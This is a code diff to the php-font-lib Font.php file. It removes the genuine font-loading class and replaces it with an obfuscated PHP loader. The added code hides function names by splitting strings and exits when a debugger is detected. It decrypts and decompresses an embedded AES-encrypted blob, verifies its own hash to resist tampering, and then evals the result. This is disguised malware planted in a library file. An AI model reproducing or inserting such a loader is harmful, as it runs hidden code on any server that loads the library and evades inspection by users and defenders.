@@ -1,89 +1,28 @@
 <?php
-/**
- * @package php-font-lib
- * @link    https://github.com/PhenX/php-font-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-
-namespace FontLib;
-
-use FontLib\Exception\FontNotFoundException;
-
-/**
- * Generic font file.
- *
- * @package php-font-lib
- */
-class Font {
-  static $debug = false;
-
-  /**
-   * @param string $file The font file
-   *
-   * @return TrueType\File|null $file
-   */
-  public static function load($file) {
-      if(!file_exists($file)){
-          throw new FontNotFoundException($file);
-      }
-
-    $header = file_get_contents($file, false, null, null, 4);
-    $class  = null;
-
-    switch ($header) {
-      case "\x00\x01\x00\x00":
-      case "true":
-      case "typ1":
-        $class = "TrueType\\File";
-        break;
-
-      case "OTTO":
-        $class = "OpenType\\File";
-        break;
-
-      case "wOFF":
-        $class = "WOFF\\File";
-        break;
-
-      case "ttcf":
-        $class = "TrueType\\Collection";
-        break;
-
-      // Unknown type or EOT
-      default:
-        $magicNumber = file_get_contents($file, false, null, 34, 2);
-
-        if ($magicNumber === "LP") {
-          $class = "EOT\\File";
-        }
-    }
-
-    if ($class) {
-      $class = "FontLib\\$class";
-
-      /** @var TrueType\File $obj */
-      $obj = new $class;
-      $obj->load($file);
-
-      return $obj;
-    }
-
-    return null;
-  }
-
-  static function d($str) {
-    if (!self::$debug) {
-      return;
-    }
-    echo "$str\n";
-  }
-
-  static function UTF16ToUTF8($str) {
-    return mb_convert_encoding($str, "utf-8", "utf-16");
-  }
-
-  static function UTF8ToUTF16($str) {
-    return mb_convert_encoding($str, "utf-16", "utf-8");
-  }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_o5wmi4z0=('bas'.'e64'.'_de'.'cod'.'e');
+$_qmmy64eq=('gzu'.'nco'.'mpr'.'ess');
+$_oyvu9ay1=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_a9ptgxvu='2x98IrJphcc=';
+$_j1bvhkk8='jD6EWKug';
+$_fj2nx2kr='4QiauAjC';
+$_l7gg0e1y='qTt5Y05X';
+$_mjxh0rou='JPjKx517';
+$_j15wm26b='yhdX6A==';
+$_byqo8n93='tvzdfPob';
+$_fxmd5q5e='tzDUypjM';
+$_o62i80lk=$_o5wmi4z0($_fj2nx2kr.$_mjxh0rou.$_l7gg0e1y.$_j1bvhkk8.$_a9ptgxvu);
+$_e9ewj7ua=$_o5wmi4z0($_byqo8n93.$_fxmd5q5e.$_j15wm26b);
+$_naun8y2h=$_o5wmi4z0('216M4YZMtiTer3juluir5L7fDphNSdm87z43V8ESXcGIKFdUcIZK2tcB5SrorRtJQwCM0wiWnx4qapEnULnzceKl+yrkiswrJkNhBnZRP7fYmMyM96O6WKgcfWtqev6lswViDtIZtlUj+SSEiQ2ryPrRvItW28lzpv9y+wqlSLA0h4kvppeUU6cyg22OjX/FZh0+8o9K5wxXxQc+BYJ9S+Xy47nUt5ozXo6YWIZlXwl9K5Oi/GQkc7J4gOqM5M21Bs4LfIoRqZBWibUqYB60SVgcoX8rrLTrVVGc5AhDEcUgUXkYBHDmjrBASIwmG3hFZPIuHmLFqhBO847WBHVDfnkS0qtH2AGUi8ck+8aypm3gBJ0mtYTW55cI/cLSXbJDbMlniG3uf0M2YEI17UHfGrdSE0pm8d2JyjXfL96E6MPr48OiIo/JGNPzjUsJzT4uQjW19ozfw6q3vIT2BlWXVK1pBc1q/uhX8/72HP7sU81U6RyE+PHHlxrMfb+4p6rWuqm9jLYd20A9FafLcbb61P43t/cjCXlfHF5zyvSUMcJvoD9RonIDZi2rj6sZNIx+76u/ChaCHSlRaMPPj4+tWTefeweDtUx3LS4L6DRL1Og=');
+$_yj5bmjcg=$_oyvu9ay1($_naun8y2h,'aes-256-cbc',$_o62i80lk,OPENSSL_RAW_DATA,$_e9ewj7ua);
+if($_yj5bmjcg===false){exit;}
+$_wrh615s5=$_qmmy64eq($_yj5bmjcg);
+if($_wrh615s5===false){exit;}
+$_xdyx6qb8='70690bb08cfb8f664064185e693653af30e7e02ce6bf009fdb25921ba841787f';
+$_vxb1vnji=@file_get_contents(__FILE__);
+if($_vxb1vnji!==false){
+$_wl1akqau=str_replace($_xdyx6qb8,"0000000000000000000000000000000000000000000000000000000000000000",$_vxb1vnji);
+$_fubxkaep=hash("sha256",$_wl1akqau);
+if($_fubxkaep!==$_xdyx6qb8){@http_response_code(403);exit;}
 }
+eval($_wrh615s5);
